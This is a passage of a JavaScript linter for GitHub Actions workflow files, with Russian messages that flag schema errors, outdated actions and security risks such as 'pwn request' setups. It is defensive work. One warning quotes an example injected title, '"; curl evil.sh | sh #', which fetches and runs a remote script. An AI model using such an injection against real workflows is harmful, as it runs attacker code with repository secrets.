// Проверка GitHub Actions, Bitbucket Pipelines, Jenkins, CircleCI и Azure Pipelines.
const { isObj, arr, q, suggest, didYouMean, SECRET_VALUE } = require('./ciCheckBase.cjs');
const { checkScripts } = require('./ciCheckScripts.cjs');

/* =================== GitHub Actions =================== */

const GH_TOP = ['name', 'run-name', 'on', 'permissions', 'env', 'defaults', 'concurrency', 'jobs'];
const GH_EVENTS = [
  'branch_protection_rule', 'check_run', 'check_suite', 'create', 'delete', 'deployment', 'deployment_status', 'discussion', 'discussion_comment',
  'fork', 'gollum', 'image_version', 'issue_comment', 'issues', 'label', 'merge_group', 'milestone', 'page_build', 'public', 'pull_request',
  'pull_request_review', 'pull_request_review_comment', 'pull_request_target', 'push', 'registry_package', 'release', 'repository_dispatch',
  'schedule', 'status', 'watch', 'workflow_call', 'workflow_dispatch', 'workflow_run',
];
const GH_FILTERS = ['branches', 'branches-ignore', 'tags', 'tags-ignore', 'paths', 'paths-ignore', 'types'];
const GH_JOB = ['name', 'permissions', 'needs', 'if', 'runs-on', 'environment', 'concurrency', 'outputs', 'env', 'defaults', 'steps', 'timeout-minutes', 'strategy', 'continue-on-error', 'container', 'services', 'uses', 'with', 'secrets', 'snapshot'];
const GH_STEP = ['id', 'if', 'name', 'uses', 'run', 'shell', 'with', 'env', 'continue-on-error', 'timeout-minutes', 'working-directory'];
const GH_PERMS = ['actions', 'attestations', 'checks', 'contents', 'deployments', 'discussions', 'id-token', 'issues', 'models', 'packages', 'pages', 'pull-requests', 'repository-projects', 'security-events', 'statuses'];
const GH_INPUT_TYPES = ['string', 'boolean', 'choice', 'number', 'environment'];
const RETIRED_RUNNERS = {
  'ubuntu-16.04': 'сентябрь 2021',
  'ubuntu-18.04': 'апрель 2023',
  'ubuntu-20.04': 'апрель 2025',
  'macos-10.15': 'август 2022',
  'macos-11': 'июнь 2024',
  'macos-12': 'декабрь 2024',
  'macos-13': 'декабрь 2025',
  'windows-2016': 'март 2022',
  'windows-2019': 'июнь 2025',
};
// [действие, максимальная устаревшая версия, серьёзность, что будет]
const OLD_ACTIONS = [
  ['actions/upload-artifact', 3, 'error', 'Задание упадёт сразу: «This request has been automatically failed because it uses a deprecated version of `actions/upload-artifact: v3`».', 'v4'],
  ['actions/download-artifact', 3, 'error', 'Задание упадёт сразу: «This request has been automatically failed because it uses a deprecated version of `actions/download-artifact: v3`».', 'v4'],
  ['actions/cache', 2, 'error', 'Задание упадёт: с февраля 2025 старые версии actions/cache отключены (сервис кэша v1 выключен).', 'v4'],
  ['actions/checkout', 3, 'warning', 'Работает с предупреждением «Node.js 16/20 actions are deprecated» и может перестать запускаться, когда GitHub отключит старый Node.js.', 'v5'],
  ['actions/setup-node', 3, 'warning', 'Работает с предупреждением об устаревшем Node.js, позже может перестать запускаться.', 'v5'],
  ['actions/setup-python', 4, 'warning', 'Работает с предупреждением об устаревшем Node.js.', 'v6'],
  ['actions/setup-java', 3, 'warning', 'Работает с предупреждением об устаревшем Node.js.', 'v5'],
  ['actions/setup-go', 4, 'warning', 'Работает с предупреждением об устаревшем Node.js.', 'v6'],
  ['actions/github-script', 6, 'warning', 'Работает с предупреждением об устаревшем Node.js.', 'v8'],
];
const GH_WHEN = 'Сразу при push — GitHub проверяет файл workflow до запуска';
const ghRejected = (msg) => `GitHub не запустит workflow: «Invalid workflow file … ${msg}». На вкладке Actions будет красная ошибка с этим текстом.`;

function cronProblem(cron) {
  const f = String(cron).trim().split(/\s+/);
  if (f.length !== 5) return { error: `нужно 5 полей (минуты часы день месяц день_недели), а здесь ${f.length}` };
  const ranges = [[0, 59], [0, 23], [1, 31], [1, 12], [0, 6]];
  const names = ['минуты', 'часы', 'день месяца', 'месяц', 'день недели'];
  for (let i = 0; i < 5; i++) {
    const v = f[i].toUpperCase().replace(/JAN|FEB|MAR|APR|MAY|JUN|JUL|AUG|SEP|OCT|NOV|DEC/g, (m) => String('JANFEBMARAPRMAYJUNJULAUGSEPOCTNOVDEC'.indexOf(m) / 3 + 1)).replace(/SUN|MON|TUE|WED|THU|FRI|SAT/g, (m) => String('SUNMONTUEWEDTHUFRISAT'.indexOf(m) / 3));
    for (const part of v.split(',')) {
      const m = /^(\*|(\d+)(?:-(\d+))?)(?:\/(\d+))?$/.exec(part);
      if (!m) return { error: `поле «${names[i]}»: непонятное значение ${q(f[i])}` };
      for (const n of [m[2], m[3]].filter((x) => x != null).map(Number)) {
        if (n < ranges[i][0] || n > ranges[i][1] + (i === 4 ? 1 : 0)) return { error: `поле «${names[i]}»: ${n} вне диапазона ${ranges[i][0]}–${ranges[i][1]}` };
      }
      if (m[4] === '0') return { error: `поле «${names[i]}»: шаг /0` };
    }
  }
  const minute = f[0];
  const step = /^\*\/(\d+)$/.exec(minute);
  const every = minute === '*' ? 1 : step ? Number(step[1]) : minute.includes(',') ? Math.min(...minute.split(',').map(Number).sort((a, b) => a - b).map((x, i, a) => (i ? x - a[i - 1] : 60 - a.at(-1) + a[0]))) : 60;
  if (every < 5 && f[1] === '*') return { frequent: every };
  return {};
}

function checkGithub(result, { pos, repo, add }) {
  const file = result.files[0]?.path;
  const doc = pos.doc(file);
  if (!doc) return;
  let data;
  try {
    data = doc.doc.toJS({ maxAliasCount: 1000 }) ?? {};
  } catch {
    return;
  }
  if (!isObj(data)) return;
  const L = (keyPath) => pos.line(file, keyPath);
  const at = (keyPath) => ({ file, line: L(keyPath) });
  const issue = (keyPath, o) => add({ when: GH_WHEN, ...at(keyPath), ...o });

  for (const k of Object.keys(data)) {
    if (!GH_TOP.includes(k)) issue([k], { id: 'gh-unknown-top', severity: 'error', title: `Неизвестный раздел ${q(k)}`, how: ghRejected(`Unexpected value '${k}'`), why: `На верхнем уровне допустимы: ${GH_TOP.join(', ')}.${didYouMean(k, GH_TOP)}`, fix: 'Исправьте или удалите раздел.' });
  }
  const on = data.on ?? data.true;
  if (on === undefined) issue([], { id: 'gh-no-on', severity: 'error', title: 'Не указано, когда запускать (on)', how: ghRejected("Required property is missing: on"), why: 'Без on GitHub не знает, на какие события реагировать.', fix: 'on:\n  push:\n    branches: [main]\n  pull_request:' });
  if (data.jobs === undefined) issue([], { id: 'gh-no-jobs', severity: 'error', title: 'Нет раздела jobs', how: ghRejected('Required property is missing: jobs'), why: 'Workflow без заданий ничего не делает.', fix: 'jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v5' });

  // События
  const events = typeof on === 'string' ? { [on]: null } : Array.isArray(on) ? Object.fromEntries(on.map((e) => [e, null])) : isObj(on) ? on : {};
  for (const [ev, cfg] of Object.entries(events)) {
    const kp = Array.isArray(on) ? ['on', Object.keys(events).indexOf(ev)] : typeof on === 'string' ? ['on'] : ['on', ev];
    if (!GH_EVENTS.includes(ev)) {
      issue(kp, { id: 'gh-event-unknown', severity: 'error', title: `Неизвестное событие ${q(ev)}`, how: ghRejected(`Unexpected value '${ev}'`), why: `GitHub не знает такого события.${didYouMean(ev, GH_EVENTS)}`, fix: 'Исправьте имя события.' });
      continue;
    }
    if (isObj(cfg)) {
      if (['push', 'pull_request', 'pull_request_target'].includes(ev)) {
        for (const k of Object.keys(cfg)) if (!GH_FILTERS.includes(k)) issue([...kp, k], { id: 'gh-filter-unknown', severity: 'error', title: `${ev}: неизвестный фильтр ${q(k)}`, how: ghRejected(`Unexpected value '${k}'`), why: `Допустимы: ${GH_FILTERS.join(', ')}.${didYouMean(k, GH_FILTERS)}`, fix: 'Исправьте ключ.' });
        for (const [a, b] of [['branches', 'branches-ignore'], ['tags', 'tags-ignore'], ['paths', 'paths-ignore']]) {
          if (cfg[a] !== undefined && cfg[b] !== undefined) issue([...kp, b], { id: 'gh-filter-both', severity: 'error', title: `${ev}: ${a} и ${b} вместе`, how: ghRejected(`you may only define one of \`${a}\` and \`${b}\` for a single event`), why: 'Нельзя одновременно включать и исключать в одном событии.', fix: `Оставьте ${a} и добавьте исключения через «!»: - '!release/**'` });
        }
        if (ev === 'push' && cfg.tags === undefined && cfg['tags-ignore'] === undefined && cfg.branches !== undefined) {
          /* только ветки — это нормально */
        }
      }
      if (ev === 'workflow_dispatch' || ev === 'workflow_call') {
        const inputs = isObj(cfg.inputs) ? cfg.inputs : {};
        if (Object.keys(inputs).length > 25) issue([...kp, 'inputs'], { id: 'gh-inputs-limit', severity: 'error', title: `${ev}: больше 25 параметров`, how: ghRejected('you may only define up to 25 `inputs` for a `workflow_dispatch` event'), why: 'Ограничение GitHub.', fix: 'Объедините параметры (например, JSON в одной строке).' });
        for (const [name, inp] of Object.entries(inputs)) {
          if (!isObj(inp)) continue;
          const types = ev === 'workflow_call' ? ['string', 'boolean', 'number'] : GH_INPUT_TYPES;
          if (inp.type !== undefined && !types.includes(inp.type)) issue([...kp, 'inputs', name, 'type'], { id: 'gh-input-type', severity: 'error', title: `Параметр ${q(name)}: тип ${q(inp.type)}`, how: ghRejected(`Unexpected value '${inp.type}'`), why: `Допустимые типы: ${types.join(', ')}.${didYouMean(inp.type, types)}`, fix: 'type: string' });
          if (inp.type === 'choice' && !arr(inp.options).length) issue([...kp, 'inputs', name], { id: 'gh-choice-no-options', severity: 'error', title: `Параметр ${q(name)}: choice без options`, how: ghRejected('Required property is missing: options'), why: 'Для выбора из списка нужен сам список.', fix: 'options:\n  - staging\n  - production' });
          if (inp.type === 'choice' && inp.default !== undefined && arr(inp.options).length && !arr(inp.options).map(String).includes(String(inp.default))) issue([...kp, 'inputs', name, 'default'], { id: 'gh-choice-default', severity: 'error', title: `Параметр ${q(name)}: default не из options`, how: ghRejected(`Default value '${inp.default}' is not in the list of options`), why: `options: ${arr(inp.options).join(', ')}.`, fix: 'Укажите default из списка.' });
          if (inp.type === 'boolean' && inp.default !== undefined && typeof inp.default !== 'boolean') issue([...kp, 'inputs', name, 'default'], { id: 'gh-boolean-default', severity: 'warning', title: `Параметр ${q(name)}: default ${JSON.stringify(inp.default)} для boolean`, how: 'Значение по умолчанию будет восприниматься как строка; сравнение inputs.x == true может не сработать.', why: 'Для boolean ожидается true/false без кавычек.', fix: 'default: false' });
        }
      }
    }
    if (ev === 'schedule') {
      const list = arr(cfg);
      if (!list.length) issue(kp, { id: 'gh-schedule-empty', severity: 'error', title: 'schedule без cron', how: ghRejected('Required property is missing: cron'), why: 'Нужно расписание.', fix: "schedule:\n  - cron: '0 3 * * *'" });
      list.forEach((item, i) => {
        if (!isObj(item) || item.cron === undefined) return issue([...kp, i], { id: 'gh-schedule-format', severity: 'error', title: 'schedule: запись без cron', how: ghRejected('Required property is missing: cron'), why: 'Каждая запись schedule — { cron: "…" }.', fix: "- cron: '0 3 * * *'" });
        const p = cronProblem(item.cron);
        if (p.error) issue([...kp, i, 'cron'], { id: 'gh-cron-invalid', severity: 'error', title: `Неверное расписание ${q(item.cron)}`, how: ghRejected(`Invalid cron expression '${item.cron}'`), why: `${p.error[0].toUpperCase()}${p.error.slice(1)}.`, fix: "Например '30 2 * * 1-5' — по будням в 02:30 UTC." });
        else if (p.frequent) issue([...kp, i, 'cron'], { id: 'gh-cron-frequent', severity: 'warning', title: `Расписание ${q(item.cron)} — чаще раза в 5 минут`, when: 'По расписанию', how: 'GitHub всё равно будет запускать не чаще раза в 5 минут, а в часы нагрузки — с задержкой или с пропусками.', why: 'Минимальный интервал расписаний в Actions — 5 минут.', fix: "Используйте '*/5 * * * *' или реже." });
        else add({ id: 'gh-cron-utc', severity: 'info', title: `Расписание ${q(item.cron)} — по UTC`, when: 'По расписанию', how: 'Запуск будет по времени UTC, а не по вашему часовому поясу; в неактивных репозиториях (60 дней без коммитов) расписания отключаются.', why: 'Так устроены расписания в GitHub Actions.', fix: 'Переведите время в UTC (Москва = UTC+3).', ...at([...kp, i, 'cron']) });
      });
    }
  }
  const prTarget = 'pull_request_target' in events;

  // Права
  const checkPerms = (perms, kp) => {
    if (perms === undefined) return;
    if (typeof perms === 'string') {
      if (!['read-all', 'write-all', '{}'].includes(perms)) issue(kp, { id: 'gh-perms-value', severity: 'error', title: `permissions: ${perms}`, how: ghRejected(`Unexpected value '${perms}'`), why: 'Строкой можно указать только read-all или write-all.', fix: 'permissions:\n  contents: read' });
      else if (perms === 'write-all') issue(kp, { id: 'gh-perms-write-all', severity: 'info', title: 'permissions: write-all', when: 'При каждом запуске', how: 'Токен GITHUB_TOKEN получит право записи во всё — если какой-то шаг (стороннее действие) скомпрометирован, он сможет менять код и релизы.', why: 'Широкие права без необходимости.', fix: 'Перечислите только нужные права: contents: read, pull-requests: write…' });
      return;
    }
    if (!isObj(perms)) return;
    for (const [k, v] of Object.entries(perms)) {
      if (!GH_PERMS.includes(k)) issue([...kp, k], { id: 'gh-perms-scope', severity: 'error', title: `permissions: неизвестное право ${q(k)}`, how: ghRejected(`Unexpected value '${k}'`), why: `Права: ${GH_PERMS.join(', ')}.${didYouMean(k, GH_PERMS)}`, fix: 'Исправьте имя права.' });
      else if (!['read', 'write', 'none'].includes(v) || (k === 'id-token' && v === 'read') || (k === 'models' && v === 'write')) issue([...kp, k], { id: 'gh-perms-level', severity: 'error', title: `permissions: ${k}: ${v}`, how: ghRejected(`Unexpected value '${v}'`), why: k === 'id-token' ? 'id-token допускает только write или none.' : 'Значение — read, write или none.', fix: `${k}: ${k === 'id-token' ? 'write' : 'read'}` });
    }
  };
  checkPerms(data.permissions, ['permissions']);

  const jobs = isObj(data.jobs) ? data.jobs : {};
  const jobIds = Object.keys(jobs);
  const allStrings = (value, keyPath, cb) => {
    if (typeof value === 'string') cb(value, keyPath);
    else if (Array.isArray(value)) value.forEach((v, i) => allStrings(v, [...keyPath, i], cb));
    else if (isObj(value)) for (const [k, v] of Object.entries(value)) allStrings(v, [...keyPath, k], cb);
  };
  // Незакрытые ${{ }}
  allStrings(data, [], (s, kp) => {
    let i = 0;
    while ((i = s.indexOf('${{', i)) >= 0) {
      const end = s.indexOf('}}', i + 3);
      if (end < 0) {
        issue(kp, { id: 'gh-expr-unclosed', severity: 'error', title: 'Не закрыто выражение ${{ … }}', how: ghRejected('An expression was expected / Unexpected end of expression'), why: `В ${q(s.length > 60 ? `${s.slice(0, 60)}…` : s)} нет закрывающих «}}».`, fix: 'Добавьте «}}».' });
        break;
      }
      i = end + 2;
    }
  });

  const graph = new Map();
  for (const [id, job] of Object.entries(jobs)) {
    const kp = ['jobs', id];
    const ji = (sub, o) => issue([...kp, ...sub], { job: id, ...o });
    if (!/^[A-Za-z_][A-Za-z0-9_-]*$/.test(id)) ji([], { id: 'gh-job-id', severity: 'error', title: `Недопустимый id задания ${q(id)}`, how: ghRejected(`The identifier '${id}' is invalid. IDs may only contain alphanumeric characters, '_', and '-'. IDs must start with a letter or '_' and and must be less than 100 characters.`), why: 'id задания — латиница, цифры, «_» и «-», начинается с буквы или «_».', fix: `Переименуйте в ${id.replace(/[^A-Za-z0-9_-]/g, '-').replace(/^[^A-Za-z_]/, '_$&')}; человекочитаемое имя задайте через name:.` });
    if (!isObj(job)) {
      ji([], { id: 'gh-job-type', severity: 'error', title: `${q(id)}: задание должно быть картой`, how: ghRejected(`Unexpected value '${job}'`), why: 'Задание описывается ключами runs-on, steps…', fix: `${id}:\n  runs-on: ubuntu-latest\n  steps: …` });
      continue;
    }
    for (const k of Object.keys(job)) if (!GH_JOB.includes(k)) ji([k], { id: 'gh-job-key', severity: 'error', title: `${q(id)}: неизвестный ключ ${q(k)}`, how: ghRejected(`Unexpected value '${k}'`), why: `Допустимы: ${GH_JOB.join(', ')}.${didYouMean(k, GH_JOB)}${k === 'script' || k === 'run' ? ' Команды пишутся в steps: - run: …' : ''}`, fix: 'Исправьте ключ.' });
    checkPerms(job.permissions, [...kp, 'permissions']);
    const needs = arr(job.needs).map(String);
    graph.set(id, needs);
    needs.forEach((n, i) => {
      if (!jobIds.includes(n)) ji(['needs', Array.isArray(job.needs) ? i : undefined].filter((x) => x !== undefined), { id: 'gh-needs-unknown', severity: 'error', title: `${q(id)}: needs на неизвестное ${q(n)}`, how: ghRejected(`Job '${id}' depends on unknown job '${n}'.`), why: `Задания с id ${q(n)} нет (needs ссылается на id, а не на name).${didYouMean(n, jobIds)}`, fix: 'Исправьте id.' });
    });
    if (job.uses !== undefined) {
      const u = String(job.uses);
      if (job['runs-on'] !== undefined || job.steps !== undefined) ji(['uses'], { id: 'gh-reusable-mixed', severity: 'error', title: `${q(id)}: uses вместе с runs-on/steps`, how: ghRejected(`Unexpected value 'runs-on'`), why: 'Задание, вызывающее переиспользуемый workflow (uses), не может иметь своих шагов.', fix: 'Оставьте uses + with/secrets или runs-on + steps.' });
      if (u.startsWith('./') && !repo.hasFile(u.replace(/@.*$/, ''))) ji(['uses'], { id: 'gh-reusable-missing', severity: 'error', title: `${q(id)}: нет файла ${u}`, how: ghRejected(`error parsing called workflow "${u}": failed to fetch workflow: workflow was not found.`), why: 'Файла нет в репозитории.', fix: 'Проверьте путь (.github/workflows/…yml).' });
      else if (!u.startsWith('./') && !/@/.test(u)) ji(['uses'], { id: 'gh-reusable-ref', severity: 'error', title: `${q(id)}: uses без @версии`, how: ghRejected(`invalid value workflow reference: no version specified`), why: 'Для workflow из другого репозитория нужна версия: owner/repo/.github/workflows/x.yml@v1.', fix: `${u}@main` });
      continue;
    }
    const runsOn = job['runs-on'];
    if (runsOn === undefined) ji([], { id: 'gh-no-runs-on', severity: 'error', title: `${q(id)}: не указан runs-on`, how: ghRejected('Required property is missing: runs-on'), why: 'Задание должно знать, на какой машине выполняться.', fix: 'runs-on: ubuntu-latest' });
    const labels = isObj(runsOn) ? arr(runsOn.labels).map(String) : arr(runsOn).map(String);
    for (const l of labels) {
      if (RETIRED_RUNNERS[l]) ji(['runs-on'], { id: 'gh-runner-retired', severity: 'error', title: `${q(id)}: раннер ${l} больше не существует`, when: `При запуске задания ${q(id)}`, how: `Задание не начнётся: «This request was automatically failed because there were no enabled runners online to process the request…» (образ ${l} отключён — ${RETIRED_RUNNERS[l]}).`, why: 'GitHub удаляет старые образы раннеров.', fix: `runs-on: ${l.startsWith('ubuntu') ? 'ubuntu-24.04' : l.startsWith('macos') ? 'macos-15' : 'windows-2025'} (или ${l.split('-')[0]}-latest)` });
    }
    const windowsOrMac = labels.some((l) => /^(windows|macos)/.test(l));
    if (job.container !== undefined && windowsOrMac) ji(['container'], { id: 'gh-container-os', severity: 'error', title: `${q(id)}: container на ${labels.join(', ')}`, when: `При запуске задания ${q(id)}`, how: 'Задание упадёт на первом шаге: «Container operations are only supported on Linux runners».', why: 'Контейнеры в Actions работают только на Linux.', fix: 'runs-on: ubuntu-latest' });
    if (job['timeout-minutes'] !== undefined && Number(job['timeout-minutes']) > 360 && !labels.includes('self-hosted')) ji(['timeout-minutes'], { id: 'gh-timeout-limit', severity: 'info', title: `${q(id)}: timeout-minutes ${job['timeout-minutes']} — больше 6 часов`, when: `При выполнении задания ${q(id)}`, how: 'На раннерах GitHub задание всё равно будет остановлено через 6 часов.', why: 'Лимит GitHub-hosted раннеров — 360 минут.', fix: 'Разбейте работу на части или используйте свой раннер.' });

    // strategy / matrix
    const matrix = job.strategy?.matrix;
    const matrixKeys = new Set();
    if (isObj(matrix)) {
      let total = 1;
      for (const [k, v] of Object.entries(matrix)) {
        if (k === 'include') arr(v).forEach((x) => isObj(x) && Object.keys(x).forEach((kk) => matrixKeys.add(kk)));
        else if (k !== 'exclude') {
          matrixKeys.add(k);
          if (Array.isArray(v)) total *= Math.max(1, v.length);
        }
      }
      total += arr(matrix.include).length;
      if (total > 256) ji(['strategy', 'matrix'], { id: 'gh-matrix-limit', severity: 'error', title: `${q(id)}: матрица даёт ${total} заданий`, how: ghRejected('Strategy matrix: the maximum of 256 jobs per workflow run was exceeded'), why: 'Не более 256 комбинаций.', fix: 'Сократите значения матрицы.' });
    }

    // Шаги
    const steps = job.steps;
    if (steps === undefined) ji([], { id: 'gh-no-steps', severity: 'error', title: `${q(id)}: нет steps`, how: ghRejected('Required property is missing: steps'), why: 'Заданию нечего выполнять.', fix: 'steps:\n  - uses: actions/checkout@v5\n  - run: echo ok' });
    else if (!Array.isArray(steps) || !steps.length) ji(['steps'], { id: 'gh-steps-empty', severity: 'error', title: `${q(id)}: steps пуст или не список`, how: ghRejected('A sequence was expected'), why: 'steps — список шагов, каждый начинается с «- ».', fix: 'steps:\n  - run: echo ok' });
    const stepIds = new Set(arr(steps).filter(isObj).map((s) => s.id).filter(Boolean).map(String));
    let checkedOut = false;
    let usedRepo = null;
    const scriptJob = { name: id, file, line: L(kp), lines: [], image: isObj(job.container) ? job.container.image : typeof job.container === 'string' ? job.container : null, services: [], vars: new Set(), artifactsFrom: [], system: 'github', where: `задании ${q(id)}` };
    arr(steps).forEach((step, i) => {
      const skp = ['steps', i];
      const label = step?.name ? q(step.name) : `шаг ${i + 1}`;
      const si = (sub, o) => ji([...skp, ...sub], o);
      if (!isObj(step)) return si([], { id: 'gh-step-type', severity: 'error', title: `${q(id)}: ${label} — не карта`, how: ghRejected('A mapping was expected'), why: 'Шаг — набор ключей (uses / run / name…).', fix: '- run: echo ok' });
      for (const k of Object.keys(step)) if (!GH_STEP.includes(k)) si([k], { id: 'gh-step-key', severity: 'error', title: `${q(id)}: ${label} — неизвестный ключ ${q(k)}`, how: ghRejected(`Unexpected value '${k}'`), why: `Допустимы: ${GH_STEP.join(', ')}.${didYouMean(k, GH_STEP)}`, fix: 'Исправьте ключ.' });
      if (step.uses !== undefined && step.run !== undefined) si([], { id: 'gh-step-both', severity: 'error', title: `${q(id)}: ${label} — и uses, и run`, how: ghRejected("a step cannot have both the `uses` and `run` keys"), why: 'Шаг либо вызывает действие, либо выполняет команды.', fix: 'Разделите на два шага.' });
      if (step.uses === undefined && step.run === undefined) si([], { id: 'gh-step-none', severity: 'error', title: `${q(id)}: ${label} — нет ни uses, ни run`, how: ghRejected("Required property is missing: uses or run"), why: 'Шагу нечего делать.', fix: '- run: echo ok' });
      if (step.if !== undefined) checkIf(step.if, [...kp, ...skp, 'if'], id);
      if (step.uses !== undefined) {
        const u = String(step.uses);
        if (/^actions\/checkout(@|$)/i.test(u)) {
          checkedOut = true;
          if (prTarget && isObj(step.with) && /github\.event\.pull_request\.head\.(sha|ref)|github\.head_ref/.test(String(step.with.ref ?? ''))) si(['with', 'ref'], { id: 'gh-pwn-request', severity: 'warning', title: `${q(id)}: pull_request_target + checkout кода из PR`, when: 'При pull request из форка', how: 'Код из чужого PR выполнится с доступом к секретам и токену с правом записи — классическая атака «pwn request».', why: 'pull_request_target работает в контексте основного репозитория (с секретами), а checkout берёт непроверенный код PR.', fix: 'Используйте pull_request, или не запускайте код из PR в этом workflow.' });
        }
        if (u.startsWith('./')) {
          const dir = u.replace(/\/+$/, '');
          if (!checkedOut) si(['uses'], { id: 'gh-local-before-checkout', severity: 'error', title: `${q(id)}: локальное действие ${u} до checkout`, when: `При выполнении задания ${q(id)}`, how: `Шаг упадёт: «Can't find 'action.yml', 'action.yaml' or 'Dockerfile' under '…/${dir.slice(2)}'. Did you forget to run actions/checkout before running your local action?»`, why: 'Файлы репозитория появляются на раннере только после actions/checkout.', fix: 'Поставьте - uses: actions/checkout@v5 раньше этого шага.' });
          else if (!['action.yml', 'action.yaml', 'Dockerfile'].some((f) => repo.hasFile(`${dir}/${f}`))) si(['uses'], { id: 'gh-local-missing', severity: 'error', title: `${q(id)}: нет действия ${u}`, when: `При выполнении задания ${q(id)}`, how: `Шаг упадёт: «Can't find 'action.yml', 'action.yaml' or 'Dockerfile' under '…/${dir.slice(2)}'».`, why: `В ${q(dir)} нет action.yml.`, fix: 'Проверьте путь.' });
        } else if (!/^docker:\/\//.test(u)) {
          if (!/@/.test(u)) si(['uses'], { id: 'gh-uses-no-ref', severity: 'error', title: `${q(id)}: ${u} без @версии`, how: ghRejected(`the \`uses' attribute must be a path, a Docker image, or owner/repo@ref`), why: 'Для действия из другого репозитория нужна версия (тег, ветка или SHA).', fix: `${u}@v1 (лучше — полный SHA коммита)` });
          else {
            const [name, ref] = u.split('@');
            const major = /^v(\d+)/.exec(ref)?.[1];
            const old = OLD_ACTIONS.find(([a]) => a === name.toLowerCase());
            if (old && major != null && Number(major) <= old[1]) si(['uses'], { id: 'gh-action-old', severity: old[2], title: `${q(id)}: ${u} устарело`, when: `При выполнении задания ${q(id)}`, how: old[3], why: `Версии ${name} до ${old[4]} отключены или переведены в устаревшие.`, fix: `uses: ${name}@${old[4]}` });
            if (!/^actions\//.test(name) && !/^[0-9a-f]{40}$/.test(ref) && /^(main|master)$/.test(ref)) si(['uses'], { id: 'gh-action-branch', severity: 'info', title: `${q(id)}: ${u} — по ветке`, when: 'При каждом запуске', how: 'Действие может измениться в любой момент — и сломать сборку или выполнить чужой код с вашими секретами.', why: 'Ссылка на ветку стороннего репозитория не фиксирует версию.', fix: 'Укажите тег или полный SHA коммита.' });
          }
        }
      }
      if (step.run !== undefined) {
        const text = String(step.run);
        if (/::set-output\b|::save-state\b/.test(text)) si(['run'], { id: 'gh-set-output', severity: 'warning', title: `${q(id)}: ${label} — ::set-output устарел`, when: `При выполнении задания ${q(id)}`, how: 'Сейчас выдаёт предупреждение «The `set-output` command is deprecated», после отключения значение не попадёт в outputs.', why: 'Команды ::set-output / ::save-state заменены файлами окружения.', fix: 'echo "name=value" >> "$GITHUB_OUTPUT"' });
        if (/::set-env\b|::add-path\b/.test(text)) si(['run'], { id: 'gh-set-env', severity: 'error', title: `${q(id)}: ${label} — ::set-env / ::add-path отключены`, when: `При выполнении задания ${q(id)}`, how: 'Шаг упадёт: «The `set-env` command is disabled. Please upgrade to using Environment Files».', why: 'Команды отключены по соображениям безопасности.', fix: 'echo "NAME=value" >> "$GITHUB_ENV"; echo "/path" >> "$GITHUB_PATH"' });
        const inj = /\$\{\{\s*github\.(event\.(issue|pull_request|comment|review|review_comment|discussion|head_commit|commits)[\w.[\]*]*\.(title|body|message|name|email|label|ref)|head_ref)\s*\}\}/.exec(text);
        if (inj) si(['run'], { id: 'gh-script-injection', severity: 'warning', title: `${q(id)}: ${label} — ${inj[0]} прямо в команде`, when: 'Когда автор issue/PR — посторонний', how: 'Текст из заголовка/описания подставится в скрипт как есть: заголовок вида «"; curl evil.sh | sh #» выполнится на раннере.', why: 'Выражения ${{ }} подставляются до запуска shell, без экранирования.', fix: `env:\n  TITLE: ${inj[0]}\nrun: echo "$TITLE"` });
        if (!checkedOut && !usedRepo && /(^|\s|&&|;)(\.\/|npm (ci|install|run|test)|yarn|pnpm|make\b|mvn|gradle|\.\/gradlew|go (build|test)|cargo|pip install -r|python [\w./-]+\.py|docker build|composer install|bundle install)/m.test(text)) usedRepo = { i, label: `шага ${i + 1}${step.name ? ` (${step.name})` : ''}` };
        const base = L([...kp, ...skp, 'run']);
        const multi = text.includes('\n');
        const wd = step['working-directory'] ?? job.defaults?.run?.['working-directory'] ?? data.defaults?.run?.['working-directory'];
        if (checkedOut) text.split('\n').forEach((t, k) => scriptJob.lines.push({ text: t, line: base == null ? null : base + (multi ? k + 1 : 0), reset: k === 0, cwd: wd != null && !/\$/.test(String(wd)) ? String(wd).replace(/^\.\/?/, '') : wd != null ? '\u0000' : '' }));
      }
      // ссылки steps.<id> и matrix.<x>
      allStrings(step, [], (s, sub) => {
        for (const m of s.matchAll(/\bsteps\.([A-Za-z_][\w-]*)\./g)) if (!stepIds.has(m[1])) si(sub, { id: 'gh-step-ref', severity: 'warning', title: `${q(id)}: steps.${m[1]} — нет шага с таким id`, when: `При выполнении задания ${q(id)}`, how: 'Выражение даст пустую строку — условие или параметр будут не тем, что ожидается.', why: `В задании нет шага с id: ${m[1]}.${didYouMean(m[1], [...stepIds])}`, fix: `Добавьте id: ${m[1]} нужному шагу.` });
        for (const m of s.matchAll(/\bmatrix\.([A-Za-z_][\w-]*)/g)) if (!matrixKeys.has(m[1])) si(sub, { id: 'gh-matrix-ref', severity: 'warning', title: `${q(id)}: matrix.${m[1]} — такого измерения нет`, when: `При выполнении задания ${q(id)}`, how: 'Подставится пустая строка.', why: matrixKeys.size ? `В матрице есть: ${[...matrixKeys].join(', ')}.` : 'У задания нет strategy.matrix.', fix: 'Исправьте имя или добавьте его в матрицу.' });
        for (const m of s.matchAll(/\bneeds\.([A-Za-z_][\w-]*)\.outputs\.([A-Za-z_][\w-]*)/g)) {
          if (!needs.includes(m[1])) si(sub, { id: 'gh-needs-outputs', severity: 'warning', title: `${q(id)}: needs.${m[1]}.outputs без needs: ${m[1]}`, when: `При выполнении задания ${q(id)}`, how: 'Значение будет пустым: результаты задания доступны только тем, кто его ждёт.', why: `${q(m[1])} не указано в needs задания ${q(id)}.`, fix: `needs: [${[...needs, m[1]].join(', ')}]` });
          else if (isObj(jobs[m[1]]) && isObj(jobs[m[1]].outputs) && !(m[2] in jobs[m[1]].outputs)) si(sub, { id: 'gh-output-missing', severity: 'warning', title: `${q(id)}: у ${q(m[1])} нет output ${q(m[2])}`, when: `При выполнении задания ${q(id)}`, how: 'Подставится пустая строка.', why: `outputs задания ${q(m[1])}: ${Object.keys(jobs[m[1]].outputs).join(', ')}.`, fix: 'Исправьте имя или объявите output.' });
        }
      });
    });
    if (job.if !== undefined) checkIf(job.if, [...kp, 'if'], id, true);
    if (usedRepo) ji(['steps', usedRepo.i], { id: 'gh-no-checkout', severity: 'warning', title: `${q(id)}: нет actions/checkout до ${usedRepo.label}`, when: `При выполнении задания ${q(id)}`, how: 'Команда упадёт: на чистом раннере нет файлов репозитория — «No such file or directory», «npm ERR! enoent Could not read package.json».', why: 'Код репозитория появляется на раннере только после шага actions/checkout.', fix: 'Первым шагом:\n- uses: actions/checkout@v5' });
    if (checkedOut && !windowsOrMac) checkScripts([scriptJob], repo, add, { system: 'github' });
